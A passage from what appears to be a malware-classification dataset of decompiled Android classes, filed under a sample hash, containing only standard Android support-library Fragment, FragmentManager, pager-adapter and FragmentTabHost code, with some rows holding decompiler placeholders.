}   public void onViewStateRestored(  Bundle savedInstanceState){     this.mCalled=true;   }   public void onStart(){     this.mCalled=true;     if (!this.mLoadersStarted) {       this.mLoadersStarted=true;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         this.mLoaderManager.doStart();       }     }   }   public void onResume(){     this.mCalled=true;   }   public void onSaveInstanceState(  Bundle outState){   }   @Override public void onConfigurationChanged(  Configuration newConfig){     this.mCalled=true;   }   public void onPause(){     this.mCalled=true;   }   public void onStop(){     this.mCalled=true;   }   @Override public void onLowMemory(){     this.mCalled=true;   }   public void onDestroyView(){     this.mCalled=true;   }   public void onDestroy(){     this.mCalled=true;     if (!this.mCheckedForLoaderManager) {       this.mCheckedForLoaderManager=true;       this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doDestroy();     }   }   public void initState(){     this.mIndex=-1;     this.mWho=null;     this.mAdded=false;     this.mRemoving=false;     this.mResumed=false;     this.mFromLayout=false;     this.mInLayout=false;     this.mRestored=false;     this.mBackStackNesting=0;     this.mFragmentManager=null;     this.mActivity=null;     this.mFragmentId=0;     this.mContainerId=0;     this.mTag=null;     this.mHidden=false;     this.mDetached=false;     this.mRetaining=false;     this.mLoaderManager=null;     this.mLoadersStarted=false;     this.mCheckedForLoaderManager=false;   }   public void onDetach(){     this.mCalled=true;   }   public void onCreateOptionsMenu(  Menu menu,  MenuInflater inflater){   }   public void onPrepareOptionsMenu(  Menu menu){   }   public void onDestroyOptionsMenu(){   }   public boolean onOptionsItemSelected(  MenuItem item){     return false;   }   public void onOptionsMenuClosed(  Menu menu){   }   @Override public void onCreateContextMenu(  ContextMenu menu,  View v,  ContextMenu.ContextMenuInfo menuInfo){     getActivity().onCreateContextMenu(menu,v,menuInfo);   }   public void registerForContextMenu(  View view){     view.setOnCreateContextMenuListener(this);   }   public void unregisterForContextMenu(  View view){     view.setOnCreateContextMenuListener(null);   }   public boolean onContextItemSelected(  MenuItem item){     return false;   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mFragmentId=#"");     writer.print(Integer.toHexString(this.mFragmentId));     writer.print("" mContainerId=#"");     writer.print(Integer.toHexString(this.mContainerId));     writer.print("" mTag="");     writer.println(this.mTag);     writer.print(prefix);     writer.print(""mState="");     writer.print(this.mState);     writer.print("" mIndex="");     writer.print(this.mIndex);     writer.print("" mWho="");     writer.print(this.mWho);     writer.print("" mBackStackNesting="");     writer.println(this.mBackStackNesting);     writer.print(prefix);     writer.print(""mAdded="");     writer.print(this.mAdded);     writer.print("" mRemoving="");     writer.print(this.mRemoving);     writer.print("" mResumed="");     writer.print(this.mResumed);     writer.print("" mFromLayout="");     writer.print(this.mFromLayout);     writer.print("" mInLayout="");     writer.println(this.mInLayout);     writer.print(prefix);     writer.print(""mHidden="");     writer.print(this.mHidden);     writer.print("" mDetached="");     writer.print(this.mDetached);     writer.print("" mMenuVisible="");     writer.print(this.mMenuVisible);     writer.print("" mHasMenu="");     writer.println(this.mHasMenu);     writer.print(prefix);     writer.print(""mRetainInstance="");     writer.print(this.mRetainInstance);     writer.print("" mRetaining="");     writer.print(this.mRetaining);     writer.print("" mUserVisibleHint="");     writer.println(this.mUserVisibleHint);     if (this.mFragmentManager != null) {       writer.print(prefix);       writer.print(""mFragmentManager="");       writer.println(this.mFragmentManager);     }     if (this.mActivity != null) {       writer.print(prefix);       writer.print(""mActivity="");       writer.println(this.mActivity);     }     if (this.mParentFragment != null) {       writer.print(prefix);       writer.print(""mParentFragment="");       writer.println(this.mParentFragment);     }     if (this.mArguments != null) {       writer.print(prefix);       writer.print(""mArguments="");       writer.println(this.mArguments);     }     if (this.mSavedFragmentState != null) {       writer.print(prefix);       writer.print(""mSavedFragmentState="");       writer.println(this.mSavedFragmentState);     }     if (this.mSavedViewState != null) {       writer.print(prefix);       writer.print(""mSavedViewState="");       writer.println(this.mSavedViewState);     }     if (this.mTarget != null) {       writer.print(prefix);       writer.print(""mTarget="");       writer.print(this.mTarget);       writer.print("" mTargetRequestCode="");       writer.println(this.mTargetRequestCode);     }     if (this.mNextAnim != 0) {       writer.print(prefix);       writer.print(""mNextAnim="");       writer.println(this.mNextAnim);     }     if (this.mContainer != null) {       writer.print(prefix);       writer.print(""mContainer="");       writer.println(this.mContainer);     }     if (this.mView != null) {       writer.print(prefix);       writer.print(""mView="");       writer.println(this.mView);     }     if (this.mInnerView != null) {       writer.print(prefix);       writer.print(""mInnerView="");       writer.println(this.mView);     }     if (this.mAnimatingAway != null) {       writer.print(prefix);       writer.print(""mAnimatingAway="");       writer.println(this.mAnimatingAway);       writer.print(prefix);       writer.print(""mStateAfterAnimating="");       writer.println(this.mStateAfterAnimating);     }     if (this.mLoaderManager != null) {       writer.print(prefix);       writer.println(""Loader Manager:"");       this.mLoaderManager.dump(prefix + ""  "",fd,writer,args);     }     if (this.mChildFragmentManager != null) {       writer.print(prefix);       writer.println(""Child "" + this.mChildFragmentManager + "":"");       this.mChildFragmentManager.dump(prefix + ""  "",fd,writer,args);     }   }   public Fragment findFragmentByWho(  String who){     if (!who.equals(this.mWho)) {       if (this.mChildFragmentManager != null) {         return this.mChildFragmentManager.findFragmentByWho(who);       }       return null;     }     return this;   }   void instantiateChildFragmentManager(){     this.mChildFragmentManager=new FragmentManagerImpl();     this.mChildFragmentManager.attachActivity(this.mActivity,new FragmentContainer(){       @Override public View findViewById(      int id){         if (Fragment.this.mView == null) {           throw new IllegalStateException(""Fragment does not have a view"");         }         return Fragment.this.mView.findViewById(id);       }     } ,this);   }   public void performCreate(  Bundle savedInstanceState){     Parcelable p;     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     this.mCalled=false;     onCreate(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onCreate()"");     }     if (savedInstanceState != null && (p=savedInstanceState.getParcelable(""android:support:fragments"")) != null) {       if (this.mChildFragmentManager == null) {         instantiateChildFragmentManager();       }       this.mChildFragmentManager.restoreAllState(p,null);       this.mChildFragmentManager.dispatchCreate();     }   }   public View performCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     return onCreateView(inflater,container,savedInstanceState);   }   public void performActivityCreated(  Bundle savedInstanceState){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     this.mCalled=false;     onActivityCreated(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onActivityCreated()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchActivityCreated();     }   }   public void performStart(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();       this.mChildFragmentManager.execPendingActions();     }     this.mCalled=false;     onStart();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStart()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchStart();     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportStart();     }   }   public void performResume(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();       this.mChildFragmentManager.execPendingActions();     }     this.mCalled=false;     onResume();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onResume()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchResume();       this.mChildFragmentManager.execPendingActions();     }   }   public void performConfigurationChanged(  Configuration newConfig){     onConfigurationChanged(newConfig);     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchConfigurationChanged(newConfig);     }   }   public void performLowMemory(){     onLowMemory();     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchLowMemory();     }   }   public boolean performCreateOptionsMenu(  Menu menu,  MenuInflater inflater){     boolean show=false;     if (this.mHidden) {       return false;     }     if (this.mHasMenu && this.mMenuVisible) {       show=true;       onCreateOptionsMenu(menu,inflater);     }     if (this.mChildFragmentManager != null) {       return show | this.mChildFragmentManager.dispatchCreateOptionsMenu(menu,inflater);     }     return show;   }   public boolean performPrepareOptionsMenu(  Menu menu){     boolean show=false;     if (this.mHidden) {       return false;     }     if (this.mHasMenu && this.mMenuVisible) {       show=true;       onPrepareOptionsMenu(menu);     }     if (this.mChildFragmentManager != null) {       return show | this.mChildFragmentManager.dispatchPrepareOptionsMenu(menu);     }     return show;   }   public boolean performOptionsItemSelected(  MenuItem item){     if (!this.mHidden) {       if (this.mHasMenu && this.mMenuVisible && onOptionsItemSelected(item)) {         return true;       }       if (this.mChildFragmentManager != null && this.mChildFragmentManager.dispatchOptionsItemSelected(item)) {         return true;       }     }     return false;   }   public boolean performContextItemSelected(  MenuItem item){     if (!this.mHidden) {       if (onContextItemSelected(item)) {         return true;       }       if (this.mChildFragmentManager != null && this.mChildFragmentManager.dispatchContextItemSelected(item)) {         return true;       }     }     return false;   }   public void performOptionsMenuClosed(  Menu menu){     if (!this.mHidden) {       if (this.mHasMenu && this.mMenuVisible) {         onOptionsMenuClosed(menu);       }       if (this.mChildFragmentManager != null) {         this.mChildFragmentManager.dispatchOptionsMenuClosed(menu);       }     }   }   public void performSaveInstanceState(  Bundle outState){     Parcelable p;     onSaveInstanceState(outState);     if (this.mChildFragmentManager != null && (p=this.mChildFragmentManager.saveAllState()) != null) {       outState.putParcelable(""android:support:fragments"",p);     }   }   public void performPause(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchPause();     }     this.mCalled=false;     onPause();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onPause()"");     }   }   public void performStop(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchStop();     }     this.mCalled=false;     onStop();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStop()"");     }   }   public void performReallyStop(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchReallyStop();     }     if (this.mLoadersStarted) {       this.mLoadersStarted=false;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         if (!this.mActivity.mRetaining) {           this.mLoaderManager.doStop();         }  else {           this.mLoaderManager.doRetain();         }       }     }   }   public void performDestroyView(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchDestroyView();     }     this.mCalled=false;     onDestroyView();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onDestroyView()"");     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportNextStart();     }   }   public void performDestroy(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchDestroy();     }     this.mCalled=false;     onDestroy();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onDestroy()"");     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@34bf66af"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentContainer.code","interface FragmentContainer {   View findViewById(  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentManager.code","public abstract class FragmentManager {   public static final int POP_BACK_STACK_INCLUSIVE=1; public interface BackStackEntry {     CharSequence getBreadCrumbShortTitle();     int getBreadCrumbShortTitleRes();     CharSequence getBreadCrumbTitle();     int getBreadCrumbTitleRes();     int getId();     String getName();   } public interface OnBackStackChangedListener {     void onBackStackChanged();   }   public abstract void addOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract FragmentTransaction beginTransaction();   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract boolean executePendingTransactions();   public abstract Fragment findFragmentById(  int i);   public abstract Fragment findFragmentByTag(  String str);   public abstract BackStackEntry getBackStackEntryAt(  int i);   public abstract int getBackStackEntryCount();   public abstract Fragment getFragment(  Bundle bundle,  String str);   public abstract void popBackStack();   public abstract void popBackStack(  int i,  int i2);   public abstract void popBackStack(  String str,  int i);   public abstract boolean popBackStackImmediate();   public abstract boolean popBackStackImmediate(  int i,  int i2);   public abstract boolean popBackStackImmediate(  String str,  int i);   public abstract void putFragment(  Bundle bundle,  String str,  Fragment fragment);   public abstract void removeOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract Fragment.SavedState saveFragmentInstanceState(  Fragment fragment);   @Deprecated public FragmentTransaction openTransaction(){     return beginTransaction();   }   public static void enableDebugLogging(  boolean enabled){     FragmentManagerImpl.DEBUG=enabled;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentManagerImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3b38f032"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentManagerState.code","public final class FragmentManagerState implements Parcelable {   public static final Parcelable.Creator<FragmentManagerState> CREATOR=new Parcelable.Creator<FragmentManagerState>(){     @Override public FragmentManagerState createFromParcel(    Parcel in){       return new FragmentManagerState(in);     }     @Override public FragmentManagerState[] newArray(    int size){       return new FragmentManagerState[size];     }   } ;   FragmentState[] mActive;   int[] mAdded;   BackStackState[] mBackStack;   public FragmentManagerState(){   }   public FragmentManagerState(  Parcel in){     this.mActive=(FragmentState[])in.createTypedArray(FragmentState.CREATOR);     this.mAdded=in.createIntArray();     this.mBackStack=(BackStackState[])in.createTypedArray(BackStackState.CREATOR);   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeTypedArray(this.mActive,flags);     dest.writeIntArray(this.mAdded);     dest.writeTypedArray(this.mBackStack,flags);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentPagerAdapter.code","public abstract class FragmentPagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentPagerAdapter"";   private FragmentTransaction mCurTransaction=null;   private Fragment mCurrentPrimaryItem=null;   private final FragmentManager mFragmentManager;   public abstract Fragment getItem(  int i);   public FragmentPagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     long itemId=getItemId(position);     String name=makeFragmentName(container.getId(),itemId);     Fragment fragment=this.mFragmentManager.findFragmentByTag(name);     if (fragment != null) {       this.mCurTransaction.attach(fragment);     }  else {       fragment=getItem(position);       this.mCurTransaction.add(container.getId(),fragment,makeFragmentName(container.getId(),itemId));     }     if (fragment != this.mCurrentPrimaryItem) {       fragment.setMenuVisibility(DEBUG);       fragment.setUserVisibleHint(DEBUG);     }     return fragment;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     this.mCurTransaction.detach((Fragment)object);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(DEBUG);         this.mCurrentPrimaryItem.setUserVisibleHint(DEBUG);       }       if (fragment != null) {         fragment.setMenuVisibility(true);         fragment.setUserVisibleHint(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     if (((Fragment)object).getView() == view) {       return true;     }     return DEBUG;   }   @Override public Parcelable saveState(){     return null;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){   }   public long getItemId(  int position){     return position;   }   private static String makeFragmentName(  int viewId,  long id){     return ""android:switcher:"" + viewId + "":""+ id;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentState.code","public final class FragmentState implements Parcelable {   public static final Parcelable.Creator<FragmentState> CREATOR=new Parcelable.Creator<FragmentState>(){     @Override public FragmentState createFromParcel(    Parcel in){       return new FragmentState(in);     }     @Override public FragmentState[] newArray(    int size){       return new FragmentState[size];     }   } ;   final Bundle mArguments;   final String mClassName;   final int mContainerId;   final boolean mDetached;   final int mFragmentId;   final boolean mFromLayout;   final int mIndex;   Fragment mInstance;   final boolean mRetainInstance;   Bundle mSavedFragmentState;   final String mTag;   public FragmentState(  Fragment frag){     this.mClassName=frag.getClass().getName();     this.mIndex=frag.mIndex;     this.mFromLayout=frag.mFromLayout;     this.mFragmentId=frag.mFragmentId;     this.mContainerId=frag.mContainerId;     this.mTag=frag.mTag;     this.mRetainInstance=frag.mRetainInstance;     this.mDetached=frag.mDetached;     this.mArguments=frag.mArguments;   }   public FragmentState(  Parcel in){     this.mClassName=in.readString();     this.mIndex=in.readInt();     this.mFromLayout=in.readInt() != 0;     this.mFragmentId=in.readInt();     this.mContainerId=in.readInt();     this.mTag=in.readString();     this.mRetainInstance=in.readInt() != 0;     this.mDetached=in.readInt() != 0;     this.mArguments=in.readBundle();     this.mSavedFragmentState=in.readBundle();   }   public Fragment instantiate(  FragmentActivity activity,  Fragment parent){     if (this.mInstance != null) {       return this.mInstance;     }     if (this.mArguments != null) {       this.mArguments.setClassLoader(activity.getClassLoader());     }     this.mInstance=Fragment.instantiate(activity,this.mClassName,this.mArguments);     if (this.mSavedFragmentState != null) {       this.mSavedFragmentState.setClassLoader(activity.getClassLoader());       this.mInstance.mSavedFragmentState=this.mSavedFragmentState;     }     this.mInstance.setIndex(this.mIndex,parent);     this.mInstance.mFromLayout=this.mFromLayout;     this.mInstance.mRestored=true;     this.mInstance.mFragmentId=this.mFragmentId;     this.mInstance.mContainerId=this.mContainerId;     this.mInstance.mTag=this.mTag;     this.mInstance.mRetainInstance=this.mRetainInstance;     this.mInstance.mDetached=this.mDetached;     this.mInstance.mFragmentManager=activity.mFragments;     if (FragmentManagerImpl.DEBUG) {       Log.v(""FragmentManager"",""Instantiated fragment "" + this.mInstance);     }     return this.mInstance;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeString(this.mClassName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mFromLayout ? 1 : 0);     dest.writeInt(this.mFragmentId);     dest.writeInt(this.mContainerId);     dest.writeString(this.mTag);     dest.writeInt(this.mRetainInstance ? 1 : 0);     dest.writeInt(this.mDetached ? 1 : 0);     dest.writeBundle(this.mArguments);     dest.writeBundle(this.mSavedFragmentState);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentStatePagerAdapter.code","public abstract class FragmentStatePagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentStatePagerAdapter"";   private final FragmentManager mFragmentManager;   private FragmentTransaction mCurTransaction=null;   private ArrayList<Fragment.SavedState> mSavedState=new ArrayList<>();   private ArrayList<Fragment> mFragments=new ArrayList<>();   private Fragment mCurrentPrimaryItem=null;   public abstract Fragment getItem(  int i);   public FragmentStatePagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     Fragment.SavedState fss;     Fragment f;     if (this.mFragments.size() <= position || (f=this.mFragments.get(position)) == null) {       if (this.mCurTransaction == null) {         this.mCurTransaction=this.mFragmentManager.beginTransaction();       }       Fragment fragment=getItem(position);       if (this.mSavedState.size() > position && (fss=this.mSavedState.get(position)) != null) {         fragment.setInitialSavedState(fss);       }       while (this.mFragments.size() <= position) {         this.mFragments.add(null);       }       fragment.setMenuVisibility(DEBUG);       fragment.setUserVisibleHint(DEBUG);       this.mFragments.set(position,fragment);       this.mCurTransaction.add(container.getId(),fragment);       return fragment;     }     return f;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     while (this.mSavedState.size() <= position) {       this.mSavedState.add(null);     }     this.mSavedState.set(position,this.mFragmentManager.saveFragmentInstanceState(fragment));     this.mFragments.set(position,null);     this.mCurTransaction.remove(fragment);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(DEBUG);         this.mCurrentPrimaryItem.setUserVisibleHint(DEBUG);       }       if (fragment != null) {         fragment.setMenuVisibility(true);         fragment.setUserVisibleHint(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     if (((Fragment)object).getView() == view) {       return true;     }     return DEBUG;   }   @Override public Parcelable saveState(){     Bundle state=null;     if (this.mSavedState.size() > 0) {       state=new Bundle();       Fragment.SavedState[] fss=new Fragment.SavedState[this.mSavedState.size()];       this.mSavedState.toArray(fss);       state.putParcelableArray(""states"",fss);     }     for (int i=0; i < this.mFragments.size(); i++) {       Fragment f=this.mFragments.get(i);       if (f != null) {         if (state == null) {           state=new Bundle();         }         String key=""f"" + i;         this.mFragmentManager.putFragment(state,key,f);       }     }     return state;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){     if (state != null) {       Bundle bundle=(Bundle)state;       bundle.setClassLoader(loader);       Parcelable[] fss=bundle.getParcelableArray(""states"");       this.mSavedState.clear();       this.mFragments.clear();       if (fss != null) {         for (        Parcelable parcelable : fss) {           this.mSavedState.add((Fragment.SavedState)parcelable);         }       }       Iterable<String> keys=bundle.keySet();       for (      String key : keys) {         if (key.startsWith(""f"")) {           int index=Integer.parseInt(key.substring(1));           Fragment f=this.mFragmentManager.getFragment(bundle,key);           if (f != null) {             while (this.mFragments.size() <= index) {               this.mFragments.add(null);             }             f.setMenuVisibility(DEBUG);             this.mFragments.set(index,f);           }  else {             Log.w(TAG,""Bad fragment at key "" + key);           }         }       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentTabHost.code","public class FragmentTabHost extends TabHost implements TabHost.OnTabChangeListener {   private boolean mAttached;   private int mContainerId;   private Context mContext;   private FragmentManager mFragmentManager;   private TabInfo mLastTab;   private TabHost.OnTabChangeListener mOnTabChangeListener;   private FrameLayout mRealTabContent;   private final ArrayList<TabInfo> mTabs; public static final class TabInfo {     private final Bundle args;     private final Class<?> clss;     private Fragment fragment;     private final String tag;     TabInfo(    String _tag,    Class<?> _class,    Bundle _args){       this.tag=_tag;       this.clss=_class;       this.args=_args;     }   } static class DummyTabFactory implements TabHost.TabContentFactory {     private final Context mContext;     public DummyTabFactory(    Context context){       this.mContext=context;     }     @Override public View createTabContent(    String tag){       View v=new View(this.mContext);       v.setMinimumWidth(0);       v.setMinimumHeight(0);       return v;     }   } public static class SavedState extends View.BaseSavedState {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel in){         return new SavedState(in);       }       @Override public SavedState[] newArray(      int size){         return new SavedState[size];       }     } ;     String curTab;     SavedState(    Parcelable superState){       super(superState);     }     private SavedState(    Parcel in){       super(in);       this.curTab=in.readString();     }     @Override public void writeToParcel(    Parcel out,    int flags){       super.writeToParcel(out,flags);       out.writeString(this.curTab);     }     public String toString(){       return ""FragmentTabHost.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" curTab=""+ this.curTab+ ""}"";     }   }   public FragmentTabHost(  Context context){     super(context,null);     this.mTabs=new ArrayList<>();     initFragmentTabHost(context,null);   }   public FragmentTabHost(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mTabs=new ArrayList<>();     initFragmentTabHost(context,attrs);   }   private void initFragmentTabHost(  Context context,  AttributeSet attrs){     TypedArray a=context.obtainStyledAttributes(attrs,new int[]{R.attr.inflatedId},0,0);     this.mContainerId=a.getResourceId(0,0);     a.recycle();     super.setOnTabChangedListener(this);     if (findViewById(R.id.tabs) == null) {       LinearLayout ll=new LinearLayout(context);       ll.setOrientation(1);       addView(ll,new FrameLayout.LayoutParams(-1,-1));       TabWidget tw=new TabWidget(context);       tw.setId(R.id.tabs);       tw.setOrientation(0);       ll.addView(tw,new LinearLayout.LayoutParams(-1,-2,0.0f));       FrameLayout fl=new FrameLayout(context);       fl.setId(R.id.tabcontent);       ll.addView(fl,new LinearLayout.LayoutParams(0,0,0.0f));       FrameLayout fl2=new FrameLayout(context);       this.mRealTabContent=fl2;       this.mRealTabContent.setId(this.mContainerId);       ll.addView(fl2,new LinearLayout.LayoutParams(-1,0,1.0f));     }   }   @Override @Deprecated public void setup(){     throw new IllegalStateException(""Must call setup() that takes a Context and FragmentManager"");   }   public void setup(  Context context,  FragmentManager manager){     super.setup();     this.mContext=context;     this.mFragmentManager=manager;     ensureContent();   }   public void setup(  Context context,  FragmentManager manager,  int containerId){     super.setup();     this.mContext=context;     this.mFragmentManager=manager;     this.mContainerId=containerId;     ensureContent();     this.mRealTabContent.setId(containerId);     if (getId() == -1) {       setId(R.id.tabhost);     }   }   private void ensureContent(){     if (this.mRealTabContent == null) {       this.mRealTabContent=(FrameLayout)findViewById(this.mContainerId);       if (this.mRealTabContent == null) {         throw new IllegalStateException(""No tab content FrameLayout found for id "" + this.mContainerId);       }     }   }   @Override public void setOnTabChangedListener(  TabHost.OnTabChangeListener l){     this.mOnTabChangeListener=l;   }   public void addTab(  TabHost.TabSpec tabSpec,  Class<?> clss,  Bundle args){     tabSpec.setContent(new DummyTabFactory(this.mContext));     String tag=tabSpec.getTag();     TabInfo info=new TabInfo(tag,clss,args);     if (this.mAttached) {       info.fragment=this.mFragmentManager.findFragmentByTag(tag);       if (info.fragment != null && !info.fragment.isDetached()) {         FragmentTransaction ft=this.mFragmentManager.beginTransaction();         ft.detach(info.fragment);         ft.commit();       }     }     this.mTabs.add(info);     addTab(tabSpec);   }   @Override protected void onAttachedToWindow(){     super.onAttachedToWindow();     String currentTab=getCurrentTabTag();     FragmentTransaction ft=null;     for (int i=0; i < this.mTabs.size(); i++) {       TabInfo tab=this.mTabs.get(i);       tab.fragment=this.mFragmentManager.findFragmentByTag(tab.tag);       if (tab.fragment != null && !tab.fragment.isDetached()) {         if (tab.tag.equals(currentTab)) {           this.mLastTab=tab;         }  else {           if (ft == null) {             ft=this.mFragmentManager.beginTransaction();           }           ft.detach(tab.fragment);         }       }     }     this.mAttached=true;     FragmentTransaction ft2=doTabChanged(currentTab,ft);     if (ft2 != null) {       ft2.commit();       this.mFragmentManager.executePendingTransactions();     }   }   @Override protected void onDetachedFromWindow(){     super.onDetachedFromWindow();     this.mAttached=false;   }   @Override protected Parcelable onSaveInstanceState(){     Parcelable superState=super.onSaveInstanceState();     SavedState ss=new SavedState(superState);     ss.curTab=getCurrentTabTag();     return ss;   }   @Override protected void onRestoreInstanceState(  Parcelable state){     SavedState ss=(SavedState)state;     super.onRestoreInstanceState(ss.getSuperState());     setCurrentTabByTag(ss.curTab);   }   @Override public void onTabChanged(  String tabId){     FragmentTransaction ft;     if (this.mAttached && (ft=doTabChanged(tabId,null)) != null) {       ft.commit();     }     if (this.mOnTabChangeListener != null) {       this.mOnTabChangeListener.onTabChanged(tabId);     }   }   private FragmentTransaction doTabChanged(  String tabId,  FragmentTransaction ft){     TabInfo newTab=null;     for (int i=0; i < this.mTabs.size(); i++) {       TabInfo tab=this.mTabs.get(i);       if (tab.tag.equals(tabId)) {         newTab=tab;       }     }     if (newTab == null) {       throw new IllegalStateException(""No tab known for tag "" + tabId);     }     if (this.mLastTab != newTab) {       if (ft == null) {         ft=this.mFragmentManager.beginTransaction();       }       if (this.mLastTab != null && this.mLastTab.fragment != null) {         ft.detach(this.mLastTab.fragment);       }       if (newTab != null) {         if (newTab.fragment == null) {           newTab.fragment=Fragment.instantiate(this.mContext,newTab.clss.getName(),newTab.args);           ft.add(this.mContainerId,newTab.fragment,newTab.tag);         }  else {           ft.attach(newTab.fragment);         }       }       this.mLastTab=newTab;     }     return ft;   } } "
